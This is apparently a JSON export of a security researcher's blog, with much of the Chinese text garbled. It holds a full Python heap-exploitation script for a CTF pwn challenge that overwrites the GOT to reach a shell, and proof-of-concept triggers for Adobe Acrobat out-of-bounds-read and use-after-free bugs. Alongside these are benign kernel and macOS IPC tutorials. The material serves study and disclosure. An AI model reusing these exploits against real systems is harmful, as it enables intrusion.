{"pages":[{"title":"Pwnable Log","text":"ä¸‹é¢è¿™äº›æ˜¯ä¸€ä»½å…³äºCTFä¸­PWNç±»å‹é¢˜ç›®çš„ä¸€ç‚¹æ€»ç»“ï¼Œä¸ªäººç²¾åŠ›æœ‰é™ï¼Œåªåšäº†è¿™ä¹ˆä¸€ç‚¹ã€‚ä»æ¥è§¦è¿™äº›æ¥ï¼Œä¸¤å¹´äº†å§ï¼Œæ‰€å­¦åˆ°çš„ä¸œè¥¿éƒ½æ¥è‡ªäº’è”ç½‘ã€ä¸€äº›å‰è¾ˆçš„æŒ‡ç‚¹ï¼Œæ‰€ä»¥æƒ³ç€æŠŠè‡ªå·±äº†è§£çš„åšæˆä¸€ä¸ªlistï¼Œç®€å•çš„æ•´åˆï¼Œæ–¹ä¾¿å…¶ä»–äººå­¦ä¹ ã€‚ä¸è¶³ä¹‹å¤„è¿˜è¯·è§è°…ï¼Œæ¬¢è¿è¡¥å……ã€‚ Pwnable log by muhe@Sycloverå¦‚æœè¿™ä¸ªlistæœ‰é—®é¢˜ï¼Œè¯·ä¸æˆ‘é‚®ä»¶è”ç³»o0xmuhe#gmail.com Pwnable log1. Stack Vuln1.1 Vuln1.1.1 Stack overflow1.1.2 Stack Variables uninitialized1.1.3 off by one1.2 Tech1.2.1 ROP[1] Dynamic Linking[2] Static Linking[3] x86 &amp;&amp; x641.2.2 Frame Fake2. Heap Vuln2.1 Vuln2.1.1 unsafe unlink (old libc)2.1.2 off by one2.1.3 double free2.1.4 use after free2.2 Tech2.2.1 Malloc Maleficarum[1] The House of Prime[2] The House of Mind[3] The House of Force[4] The House of Lore[5] The House of Spirit2.2.2 unsorted bin unlink(free â€˜dâ€™)2.2.3 small/large bin unlink(mallocâ€™d)2.2.4 fastbin dumlicate2.2.5 hijack function pointer2.2.6 craft overlapping chunks2.2.7 heap spray3. Format String Vuln3.1 Vuln3.1.1 x863.1.2 x643.2 Tech3.2.1 leak func addr3.2.2 dump bin file with fmt4. Other Vuln4.1 Vuln4.1.1 Integer overflow4.1.2 fsp overflow4.2 Tech4.2.1 ssp leak5. Some Tricks5.1 one gadget rce5.2 canary crack5.3 canary leak5.4 bin file dump5.5 fast confirm libcâ€™s version6. Pwn in AD mode","link":"/Pwnable-Log/index.html"},{"title":"tags","text":"","link":"/tags/index.html"},{"title":"About Me","text":"å…³æ³¨äºŒè¿›åˆ¶å®‰å…¨- RE - PWN Member of Syclover&nbsp;&nbsp;&nbsp;&nbsp;é…·ç‚«çš„ä¸»é¡µ å‰CTFerre &amp;&amp; pwn å¼±é¸¡ :) Work Qihoo360 (2017.7â€“2020.1) Andsecurity (2020.1â€“2020.11) æŸç”²æ–¹(2020.11â€“) bug hunting &amp;&amp; exploit BugsCVE-2018-12757,CVE-2018-12831,CVE-2018-16041,CVE-2019-7062, CVE-2019-7063,CVE-2019-7064, CVE-2019-7067,CVE-2019-7018, CVE-2019-7019, CVE-2019-7020,CVE-2019-7021, CVE-2019-7022, CVE-2019-7023, CVE-2019-7024, CVE-2019-7029,CVE-2019-7813, AdobeDCPro_Touch_UaF, Foxit Reader OOBR, AFDKO bugs, macOS atsd oobr, Skype msg spoof GPG12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152-----BEGIN PGP PUBLIC KEY BLOCK-----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Z7tt-----END PGP PUBLIC KEY BLOCK-----","link":"/about/index.html"},{"title":"frinds","text":"Syclover Teamæœ€çˆ±çš„é«˜è€å¸ˆ0x9A82å­¦å¼ŸK1n9å¸ˆå‚…L3monå’¸é±¼rootclayV1ct0rGodotå­¦å¼ŸHomaebicå­¦å¼Ÿä¸¤ç±³çš„sco4x0JimmyZhouç­äº¡å”å”JasonMosuank0sh1WinterSunVenenofIcemakrSwing4ido10nç‹æ¾_Striker7topbendawangå‰ç«¯jokerå¤§ä½¬lc4tSzrzvdnysixwhaleå°å§å§CTF Ranké‡åº†äº”å¥—æˆ¿çš„å°è‘±çŸ³å¤´é‚¢è€å¸ˆæœ€ä¼˜ç§€m3lon","link":"/frinds/index.html"},{"title":"categories","text":"","link":"/categories/index.html"}],"posts":[{"title":"360æ˜¥ç§‹CTF--pwn","text":"0x00 : pwn300 smallest1.vulnç›´æ¥æ ˆæº¢å‡ºï¼Œä½†æ˜¯åˆ©ç”¨SYSCALLè¯»å–çš„ã€‚ 2. thinkè€ƒå¯ŸSROP 3. exploit1:( undone. 0x01 : pwn350 hiddenlove1.vulnè¯´å¥é¢˜å¤–è¯â€¦å‡ ä¹åŸå°ä¸åŠ¨æŠ„hitcon2016â€“babyheapçš„ï¼Œå°±æ”¹äº†æ”¹å­—ç¬¦ä¸²â€¦ è¾“å…¥å‡½æ•°çš„off-by-oneã€‚ 2. thinkç¨‹åºé™åˆ¶äº†åªèƒ½ä¸€æ¬¡editä¸€æ¬¡freeï¼Œä½†æ˜¯æç¤ºubuntu16.04ç‰ˆæœ¬ï¼Œè¿™ä¸ªç‰ˆæœ¬scanfå‡½æ•°è¯»å–å¤§é‡æ•°æ®ä¼šæœ‰heapçš„åˆ†é…ã€‚ é€šè¿‡å †å¸ƒå±€æ¥ä¼ªé€ å †å¤´ç»“æ„ï¼Œç„¶åå†ç»“åˆoff by oneä¼ªé€ æŒ‡é’ˆï¼Œå¾—åˆ°ä»»æ„åœ°å€è¯»å†™ï¼Œç„¶ååŠ«æŒgotå»get shellã€‚ 3. exploitå…¶å®ç›´æ¥æ‹¿babyheapçš„expæ”¹å°±è¡Œäº†â€¦ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151#!/usr/bin/env pythonfrom sc_pwn import *env = Environment('local', 'remote')env.set_item('target', local = {'host':'localhost','port':10001}, \\ remote = {'host':'106.75.84.68','port':20000})env.select()binf = ELF('./hiddenlove', rop=True)libc = ELF('./libc.so.6')'''addr_got_free = binf.got('free')addr_got_exit = binf.got('exit')addr_got_puts = binf.got('puts')addr_plt_puts = binf.plt('puts')addr_plt_printf = binf.plt('printf')addr_plt_alarm = binf.plt('alarm')addr_plt_read = binf.plt('read')addr_plt_stack_cf = binf.plt('__stack_chk_fail')addr_plt_libc_stm = binf.plt('__libc_start_main')addr_plt_malloc = binf.plt('malloc')addr_plt_atoi = binf.plt('atoi')addr_plt_scanf = binf.plt('__isoc99_scanf')addr_plt_setbuf = binf.plt('setbuf')addr_plt_exit = binf.plt('exit')'''#==========def attack(cmn): bh = BabyHeap(cmn) chunk_1 = 'nn' chunk_1 += '\\x00'*(0x1000-0x18-len(chunk_1)) chunk_1 += pack_64(0x50) bh.Exit(chunk_1) print 'part 1 done' chunk_3 = pack_64(0) chunk_3 += pack_64(0x21) bh.New(0x80, chunk_3, 'A'*8) print 'part 2 done' bh.Delete() print 'part 3 done' rewrite_got = pack_64(0x4006C0+6) # puts rewrite_got += pack_64(0x4006D0+6) #stack_check rewrite_got += pack_64(0x4006E0+6) #setbuf rewrite_got += pack_64(0x4006F0+6) #printf rewrite_got += pack_64(0x400700+6) # alarm rewrite_got += pack_64(0x400710+6) # read rewrite_got += pack_64(0x400720+6) # start main rewrite_got += pack_64(0x400730+6) #malloc rewrite_got += pack_64(0x4006F0) # atoi --changed rewrite_got += pack_64(0x400750+6) rewrite_got += pack_64(0x400700) #exit chunk_2 = '\\x00'*0x20 chunk_2 += pack_64(len(rewrite_got)) # size chunk_2 += pack_64(0) # name (over written) chunk_2 += pack_64(addr_got_puts) # &amp;content bh.New(0x48, chunk_2, 'name') bh.Edit(rewrite_got) # got_exit &lt;- alarm, got_atoi &lt;- printf print 'part 4 done' #cmn.read_until('feet') sleep(0.5) cmn.send('%7$saaaa'+pack_64(addr_got_free)) # FSB junk = cmn.read_until('4.Just throw yourself at her feet\\n') addr_libc_free = cmn.read(6).ljust(8, &quot;\\x00&quot;) addr_libc_free = unpack_64(addr_libc_free+'\\x00'*(8-len(addr_libc_free))) info('addr_libc_free = 0x%08x' % addr_libc_free) print 'part 5 done' libc.set_location('free', addr_libc_free) addr_libc_system = libc.function('system') info('addr_libc_system = 0x%08x' % addr_libc_system) print 'part 6 done' rewrite_got = pack_64(0x0000000004006C0+6) #puts rewrite_got += pack_64(0x0000000004006D0+6) #fail rewrite_got += pack_64(0x00000000004006E0+6) #setbuf rewrite_got += pack_64(0x00000000004006F0+6) #printf rewrite_got += pack_64(0x0000000000400700+6)#alarm rewrite_got += pack_64(0x400716) #read rewrite_got += pack_64(0x000000000400720+6) #start rewrite_got += pack_64(0x000000000400730+6) #malloc rewrite_got += pack_64(addr_libc_system) #atoi rewrite_got += pack_64(0x000000000400750+6) #scanf rewrite_got += pack_64(0x400B0B) #exit cmn.read_until('feet') cmn.sendln('2') cmn.read_until('feelings') cmn.send(rewrite_got) sleep(0.5) cmn.send('/bin/sh\\0') #==========class BabyHeap: def __init__(self, cmn): self._read = cmn.read self._read_until = cmn.read_until self._send = cmn.send self._sendln = cmn.sendln def New(self, size, content, name): self._read_until('feet') self._sendln('1') prompt = self._read(12) if 'how many' in prompt: self._sendln(str(size)) self._read_until('her(0~1000)') self._send(content) self._read_until('name') self._send(name) else: fail('Remote program is exited') def Delete(self): self._read_until('feet') self._sendln('3') def Edit(self, content): self._read_until('feet') self._sendln('2') self._read_until('feelings') self._send(content) def Edit1(self, content): self._sendln('2') sleep(0.5) self._send(content) def Exit(self, ans): self._read_until('feet') self._sendln('4') self._read_until('(Y/N)') self._sendln(ans) #==========if __name__=='__main__': cmn = Communicate(env.target,mode='SOCKET') attack(cmn) sh = Shell(cmn) sh.select() del(sh) del(cmn)#========== 0x03 :åæ§½è¿™ä¸ªæ¯”èµ›è¿ç»´æ°´å¹³çœŸçš„æœ‰é—®é¢˜â€¦ é¢˜ç›®é‡å¤è¿™ä¸ªä¹Ÿä¸è¯´äº†ï¼Œåæ­£æŸæ˜¥ç§‹ä¹‹å‰çš„æ¯”èµ›ä¹Ÿæ˜¯è¿™æ ·ã€‚","link":"/2017/04/22/360%E6%98%A5%E7%A7%8BCTF-pwn/"},{"title":"Adobe Acrobat DC Pro OOB(CVE-2019-7813)","text":"InfoOut-of-Bounds Read PoC12345678910%PDF-1.71 0 obj&lt;&lt;&gt;&gt;%endobjtrailer&lt;&lt;/Root&lt;&lt;/Pages 1 0 R&gt;&gt;&gt;&gt; click Fileâ€“&gt;Properties boring bug :( Patch &amp;&amp; Bulletinadobe psirt","link":"/2019/05/15/Adobe-Acrobat-DC-Pro-OOB-CVE-2019-7813/"},{"title":"Adding your own syscall in linux kernel","text":"0x00:ä¸»è¦æ˜¯ä¸€ä¸ªè®°å½•ï¼Œækernel exploitå¯èƒ½ä¼šéœ€è¦ã€‚ç»™è‡ªå·±çš„linuxå¢åŠ ä¸€ä¸ªè‡ªå®šä¹‰çš„ç³»ç»Ÿè°ƒç”¨ï¼Œå¼€å§‹æ‰¾çš„èµ„æ–™æ¯”è¾ƒè€3.xçš„å†…æ ¸ï¼Œç„¶è€Œ4.xçš„æºç å’Œ3.xæºç ç»“æ„ä¸å¤ªä¸€æ ·ï¼Œæ‰€ä»¥è¿‡ç¨‹ä¹Ÿä¸å¤ªä¸€æ ·ï¼Œå¤šå¤šå‚è€ƒä¸€äº›æ¯”è¾ƒå®˜æ–¹çš„æ–‡æ¡£ ç¯å¢ƒå‡†å¤‡ ubuntu 14.04 LTS x86 (4.2.0-42-generic) 0x01:è¿‡ç¨‹1.è·å–æºç apt-get source linux-image-$(uname -r) 2.ç¼–è¾‘æºç é¦–å…ˆåˆ›å»ºä¸€ä¸ªç›®å½•æ”¾æ–°å¢ç³»ç»Ÿè°ƒç”¨çš„å®šä¹‰mkdir helloworld &amp;&amp; cd helloworldç„¶åè¿›å» 123# muhe @ ubuntu in ~/linux_kernel_study/linux-lts-wily-4.2.0/helloworld [6:48:05] $ lshelloworld.c Makefile 123456#include &lt;linux/kernel.h&gt;asmlinkage long sys_helloworld(void){ printk(\"Hello world\\n\"); return 0;} 12Makefileobj-y=helloworld.o ç„¶åä¿®æ”¹æºç ç›®å½•ä¸‹çš„Makefileï¼ŒæŠŠåˆšæ‰æ–°å»ºçš„helloworldç›®å½•åŠ è¿›å»å¦‚å›¾æ‰€ç¤º ä¿®æ”¹include/linux/syscalls.hæ–‡ä»¶ï¼ŒæŠŠhelloworldåŸå‹åŠ è¿›å» 12345678...asmlinkage long sys_bpf(int cmd, union bpf_attr *attr, unsigned int size);asmlinkage long sys_execveat(int dfd, const char __user *filename, const char __user *const __user *argv, const char __user *const __user *envp, int flags);asmlinkage long sys_helloworld(void);#endif ç„¶åä¿®æ”¹arch/x86/entry/syscallsä¸‹çš„syscall_32.tblæ–‡ä»¶ æ·»åŠ è¿™ä¸ªè°ƒç”¨çš„ä¿¡æ¯ 123456...355 i386 getrandom sys_getrandom356 i386 memfd_create sys_memfd_create357 i386 bpf sys_bpf358 i386 execveat sys_execveat stub32_execveat359 i386 helloworld sys_helloworld 3.ç¼–è¯‘æ–°å†…æ ¸å…ˆå®‰è£…ä¸€äº›éœ€è¦çš„å·¥å…· 123sudo apt-get build-dep linux-image-$(uname -r)sudo apt-get updatesudo apt-get install curses-dev ç„¶åæ˜¯é…ç½® 1234chmod a+x debian/scripts/*chmod a+x debian/scripts/misc/*fakeroot debian/rules cleanfakeroot debian/rules editconfigs ç¼–è¯‘ 12fakeroot debian/rules cleanfakeroot debian/rules binary-headers binary-generic -j 2 4.å®‰è£…å› ä¸ºè¿™æ ·ç¼–è¯‘å‡ºæ¥çš„æ˜¯debï¼Œæ‰€ä»¥ç›´æ¥dpkgå®‰è£…å°±è¡Œäº†ã€‚å®‰è£…ç»“æŸåç›´æ¥é‡å¯å°±å¥½äº†ã€‚ 0x02ï¼šæµ‹è¯•ç¼–å†™æµ‹è¯•ç¨‹åº 123456789101112#include &lt;stdio.h&gt;#include &lt;linux/kernel.h&gt;#include &lt;sys/syscall.h&gt;#include &lt;unistd.h&gt;int main(){ printf(\"Invoking 'helloworld' system call\"); long int ret = syscall(359); // 359 is the syscall number return 0;} ç¼–è¯‘åè¿è¡Œï¼Œç„¶åä½¿ç”¨dmesgæŸ¥çœ‹æ‰“å°çš„æ¶ˆæ¯ã€‚å¯ä»¥çœ‹åˆ°æ‰“å°äº†helloworldçš„ä¿¡æ¯ï¼Œå³è¿™ä¸ªsyscallæ·»åŠ æˆåŠŸã€‚ 0x03ï¼šå‚è€ƒä¸å¼•ç”¨Implementing a system call in Linux Kernel 4.7.1[UBUNTU 14.04] BUILDING LINUX KERNELLinux/Documentation/adding-syscalls.txtAdding hello world system call to Linux","link":"/2017/02/08/Adding-your-own-syscall-in-linux-kernel/"},{"title":"Adobe Acrobat DC Pro touchup UaF","text":"Infoåº”è¯¥æ˜¯18å¹´ä¸‹åŠå¹´fuzzåˆ°çš„ï¼Œä¸è®°å¾—å“ªä¸ªç‰ˆæœ¬çš„Adobe Acrobat DC Proçš„UaFäº†ï¼Œå½“æ—¶æµ‹è¯•çš„æ˜¯åªèƒ½åœ¨32ä½æœºå™¨ä¸Šè§¦å‘ï¼Œç•™è¿™ä¸ªæ´ç•™äº†ä¸€ä¸ªæœˆæ²¡ç®¡ï¼Œåœ¨19å¹´å¹´åˆä¿®äº†ã€‚ è—æ´è—åˆ°æœ€åä¸€æ— æ‰€æœ‰ã€‚ PoC12345678910111213141516171819var ooo = new Object();app.trigger = function() { app.doc.embedDocAsDataObject({cName:&quot;http://www.B.com&quot;, oDoc:app.trigger});}//must keep this linetry{app.doc.newPage({nWidth:200, nHeight:72, nPage:2});}catch(e){}//triggertry{ooo.valueOf = app.trigger;}catch(e){}//must keep this line try{ooo.valueOf();}catch(e){} poc.pdf","link":"/2019/07/16/Adobe-Acrobat-DC-Pro-touchup-UaF/"},{"title":"Apple IPC : DO Basic","text":"MacOS IPC ä¹‹ DO ç®€ä»‹DOå…¨ç§°æ˜¯Distributed Objectsï¼Œä»å­—é¢ä¸Šæ¥çœ‹æ„æ€å¾ˆå¥½ç†è§£ï¼Œåˆ†å¸ƒå¼å¯¹è±¡ã€‚è¿™æ˜¯ä¸€ç§IPCæ–¹å¼ï¼Œç®€å•æ˜“ç”¨ï¼Œå®ç°çš„æ•ˆæœå°±æ˜¯ï¼šé€šè¿‡launchdå’Œä¸€ä¸ªproxy objectï¼Œä»»ä½•çš„è¿›ç¨‹éƒ½å¯ä»¥è®¿é—®åˆ°serverä¸­çš„DOå¯¹è±¡ï¼Œä¹Ÿå¯ä»¥è°ƒç”¨è¿™ä¸ªå¯¹è±¡çš„æ–¹æ³•ï¼Œä»è€Œå®ç°IPCã€‚ä¸‹é¢æ˜¯ä¸€ä¸ªæµç¨‹å›¾ï¼š (å›¾æ¥è‡ªpj0çš„åšå®¢ï¼Œianbeerçš„æ–‡ç« ) ç¤ºä¾‹ä»£ç server.m 12345678910111213141516171819202122#import &lt;objc/Object.h&gt;#import &lt;Foundation/Foundation.h&gt;@interface VendMe : NSObject- (oneway void) foo: (int) value;@end@implementation VendMe- (oneway void) foo: (int) value;{NSLog(@&quot;%d&quot;, value);}@endint main (int argc, const char * argv[]) { VendMe* toVend = [[VendMe alloc] init]; NSConnection *conn = [NSConnection defaultConnection]; [conn setRootObject:toVend]; [conn registerName:@&quot;com.foo.my_test_service&quot;]; [[NSRunLoop currentRunLoop] run]; return 0;} client.m 123456789#import &lt;Cocoa/Cocoa.h&gt;int main(int argc, char** argv){ id theProxy = [[NSConnection rootProxyForConnectionWithRegisteredName:@&quot;com.foo.my_test_service&quot; host:nil] retain]; [theProxy foo:123]; return 0;} Makefile 12345all: clang client.m -o client -framework Foundation clang server.m -o server -framework Foundationclean: rm server client è¿è¡Œæ•ˆæœï¼š 123456789101112131415161718# run serverâ•°â”€$ ./server2019-08-10 22:27:07.545 server[28274:2677291] 1232019-08-10 22:27:08.897 server[28274:2677291] 1232019-08-10 22:27:09.662 server[28274:2677291] 1232019-08-10 22:27:10.172 server[28274:2677291] 123# run client times...â•­â”€muhe@muheMacBookPro ~/Downloads/DO_Studyâ•°â”€$ ./clientâ•­â”€muhe@muheMacBookPro ~/Downloads/DO_Studyâ•°â”€$ ./clientâ•­â”€muhe@muheMacBookPro ~/Downloads/DO_Studyâ•°â”€$ ./clientâ•­â”€muhe@muheMacBookPro ~/Downloads/DO_Studyâ•°â”€$ ./clientâ•­â”€muhe@muheMacBookPro ~/Downloads/DO_Studyâ•°â”€$ æ•ˆæœçœ‹èµ·æ¥å¾ˆç®€å•ï¼Œç±»ä¼¼socketé€šä¿¡é‚£ç§æ•ˆæœï¼Œserverè·‘èµ·æ¥ç­‰å¾…è¿æ¥ï¼Œclientè¿ä¸Šå»ï¼Œç„¶åé€šè¿‡launchdå’Œproxy objè°ƒç”¨äº†serveré‡Œçš„æ–¹æ³•ï¼Œå‚æ•°æ˜¯clientä¼ é€’çš„ï¼Œçœ‹èµ·æ¥åƒæ˜¯clientæ‰§è¡Œäº†ä¸€ä¸ªå‡½æ•°ï¼Œå…¶å®çœŸæ­£ä»£ç æ‰§è¡Œçš„æ˜¯serverã€‚ OCçš„è¯­æ³•è™½ç„¶å¾ˆå¥‡æ€ªï¼Œä½†æ˜¯é—®é¢˜ä¸å¤§ï¼Œè¿˜æ˜¯èƒ½çœ‹æ‡‚ï¼š server: é€šè¿‡NSConnectionæ³¨å†Œäº†ä¸€ä¸ªç”¨äºDOçš„å¯¹è±¡ï¼Œè®¾ç½®çš„å¯¹è±¡æ˜¯VendMeï¼Œæ³¨å†Œåæ˜¯com.foo.my_test_serviceï¼Œç”¨æ¥æ ‡ç¤ºè¿™ä¸ªæœåŠ¡ã€‚éšåä½¿ç”¨Runloopä½¿å¾—serverèƒ½éšæ—¶å¤„ç†äº‹ä»¶ä½†å¹¶ä¸é€€å‡º,å…³äºRunloopçš„åˆ†ææœ¬æ–‡ä¸ä¼šæ¶‰åŠã€‚ client clientçš„é€»è¾‘å¾ˆç®€å•ï¼Œé€šè¿‡NSConnectionè¿æ¥ç›®æ ‡æœåŠ¡ï¼Œç„¶åé€šè¿‡proxy objè°ƒç”¨ä»–çš„fooæ–¹æ³•ï¼Œå¹¶ä¼ é€’ä¸€ä¸ª123çš„å‚æ•°ç»™ä»–ã€‚ å¤§æ¦‚é€»è¾‘å°±è¿™ä¸ªæ ·å­ã€‚ é€†å‘åˆ†æä¸ºä»€ä¹ˆè¦æåŠè¿™éƒ¨åˆ†ï¼Œappleå¤§éƒ¨åˆ†æœåŠ¡éƒ½ä¸å¼€æºï¼Œè€Œä¸”ç”¨çš„IPCæ–¹å¼éƒ½ä¸ç¡®å®šï¼Œé€†å‘çš„æ—¶å€™éœ€è¦æƒ³åŠæ³•ç¡®å®šï¼Œå¹¶ä¸”æ‰¾åˆ°å…³é”®å‡½æ•°ï¼Œæ¯”å¦‚ä¸Šä¾‹ä¸­çš„fooå‡½æ•°ï¼Œæ‰¾åˆ°å¤„ç†å‡½æ•°ï¼Œæ–¹ä¾¿ä»£ç å®¡è®¡ã€‚ è¿™é‡Œåªéœ€è¦å…³æ³¨æœåŠ¡ç«¯ï¼ˆåºŸè¯ï¼‰ï¼Œæ‰€ä»¥ç›´æ¥è´´F5åçš„ä»£ç ï¼š 12345678910111213141516int __cdecl main(int argc, const char **argv, const char **envp){ VendMe *v3; // rax VendMe *v4; // ST28_8 void *v5; // ST20_8 void *v6; // rax v3 = objc_msgSend(&amp;OBJC_CLASS___VendMe, &quot;alloc&quot;, envp); v4 = objc_msgSend(v3, &quot;init&quot;); v5 = objc_msgSend(&amp;OBJC_CLASS___NSConnection, &quot;defaultConnection&quot;); objc_msgSend(v5, &quot;setRootObject:&quot;, v4); objc_msgSend(v5, &quot;registerName:&quot;, CFSTR(&quot;com.foo.my_test_service&quot;)); v6 = objc_msgSend(&amp;OBJC_CLASS___NSRunLoop, &quot;currentRunLoop&quot;); objc_msgSend(v6, &quot;run&quot;); return 0;} ocè¿™äº›å‡½æ•°è°ƒç”¨åŸºæœ¬éƒ½å˜æˆobjec_msgSend(a,b,xxx)äº†ï¼Œä¸è¿‡ä¸å¤ªå½±å“çœ‹ï¼Œæˆ‘çš„ç†è§£å°±æ˜¯a.b(xxx)ï¼Œå¤§æ¦‚è¿™ä¸ªæ ·å­ï¼ŒçŸ¥é“è¿™è¡Œä»£ç åœ¨åšä»€ä¹ˆï¼Œå¯¹äºé€†å‘å·²ç»å¤Ÿäº†ã€‚ å…³é”®ç‚¹åœ¨äºæ‰¾DOçš„å¯¹è±¡ä»¥åŠå’Œä»–ç»‘å®šçš„æ–¹æ³•ã€‚é€šè¿‡ä¸Šé¢çš„æ–¹æ³•ï¼Œèƒ½æ‰¾åˆ°:v4--&gt;v3--&gt;OBJC_CLASS___VendMe,é‚£ä¹ˆå°±æ˜¯OBJC_CLASS___VendMeè¿™ä¸ªå¯¹è±¡äº†ï¼Œä¸‹é¢æ˜¯æ‰¾å’Œä»–ç»‘å®šçš„æ–¹æ³•ã€‚ ç›´æ¥æ‰¾åˆ°çš„æ˜¯: 12345__objc_data:0000000100001198 _OBJC_CLASS_$_VendMe __objc2_class &lt;offset _OBJC_METACLASS_$_VendMe, \\__objc_data:0000000100001198 ; DATA XREF: __objc_classlist:0000000100001060â†‘o__objc_data:0000000100001198 ; __objc_classrefs:classRef_VendMeâ†‘o__objc_data:0000000100001198 offset _OBJC_CLASS_$_NSObject, \\__objc_data:0000000100001198 offset __objc_empty_cache, 0, offset VendMe_$classData&gt; ç„¶åæ ¹æ®classDataæ‰¾åˆ° ï¼š 12345__objc_const:00000001000010D8 VendMe_$classData __objc2_class_ro &lt;0, 8, 8, 0, 0, offset aVendme, \\__objc_const:00000001000010D8 ; DATA XREF: __objc_data:_OBJC_CLASS_$_VendMeâ†“o__objc_const:00000001000010D8 offset _OBJC_INSTANCE_METHODS_VendMe, 0, 0, 0, 0&gt; ; &quot;VendMe&quot;__objc_const:00000001000010D8 __objc_const ends__objc_const:00000001000010D8 æœ€å 